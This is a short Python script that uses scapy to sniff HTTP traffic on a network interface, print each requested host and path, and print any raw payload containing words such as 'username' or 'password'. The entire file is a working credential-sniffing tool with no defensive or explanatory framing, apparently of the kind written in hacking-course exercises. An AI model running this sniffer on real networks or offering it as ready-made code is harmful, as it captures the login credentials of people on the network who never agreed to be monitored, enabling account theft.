#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=cap)


def url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def pass1(packet):
    if packet.haslayer(scapy.Raw):
        word = packet[scapy.Raw].load
        keywords = ["username", "password", "pass", "user", "login", "uname", "name"]
        for key in keywords:
            if key in word:
                return word


def cap(packet):
    if packet.haslayer(http.HTTPRequest):
        print("HTTP Request>>" + url(packet))
        check = pass1(packet)
        if check:
            print("\n\n Login Info>>" + check+"\n\n")





sniff("eth0")
